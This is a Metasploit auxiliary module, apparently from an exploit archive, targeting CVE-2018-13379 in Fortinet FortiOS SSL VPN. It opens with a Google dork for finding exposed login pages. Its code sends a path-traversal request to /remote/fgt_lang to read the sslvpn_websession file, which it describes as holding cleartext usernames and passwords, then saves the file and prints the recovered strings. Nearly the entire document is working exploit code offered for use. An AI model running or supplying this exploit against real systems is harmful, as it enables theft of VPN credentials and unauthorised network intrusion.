# Google Dork: intext:"Please Login" inurl:"/remote/login"
# Exploit Author: Carlos E. Vieira
# Vendor Homepage: https://www.fortinet.com/
# Software Link: https://www.fortinet.com/products/fortigate/fortios.html
# Version: This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
# Tested on: 5.6.6
# CVE : CVE-2018-13379

require &#039;msf/core&#039;
class MetasploitModule < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Post::File 
	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;SSL VPN FortiOs - System file leak&#039;,
			&#039;Description&#039;    => %q{
				FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests.
				This exploit read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text).
				This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
			},
			&#039;References&#039;     =>
			    [
			        [ &#039;URL&#039;, &#039;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379&#039; ]
			    ],
			&#039;Author&#039;         => [ &#039;lynx (Carlos Vieira)&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			 &#039;DefaultOptions&#039; =>
		      {
		        &#039;RPORT&#039; => 443,
		        &#039;SSL&#039; => true
		      },
			))

	end


	def run()
		print_good("Checking target...")
		res = send_request_raw({&#039;uri&#039;=>&#039;/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession&#039;})

		if res && res.code == 200
			print_good("Target is Vulnerable!")
			data = res.body
			current_host = datastore[&#039;RHOST&#039;]
			filename = "msf_sslwebsession_"+current_host+".bin"
			File.delete(filename) if File.exist?(filename)
			file_local_write(filename, data)
			print_good("Parsing binary file.......")
			parse()
		else
			if(res && res.code == 404)
				print_error("Target not Vulnerable")
			else
				print_error("Ow crap, try again...")
			end
		end
	end
	def parse()
		current_host = datastore[&#039;RHOST&#039;]

	    fileObj = File.new("msf_sslwebsession_"+current_host+".bin", "r")
	    words = 0
	    while (line = fileObj.gets)
	    	printable_data = line.gsub(/[^[:print:]]/, &#039;.&#039;)
	    	array_data = printable_data.scan(/.{1,60}/m)
	    	for ar in array_data
	    		if ar != "............................................................"
	    			print_good(ar)
	    		end
	    	end
	    	#print_good(printable_data)
	    	
		end	
		fileObj.close	
	end
end

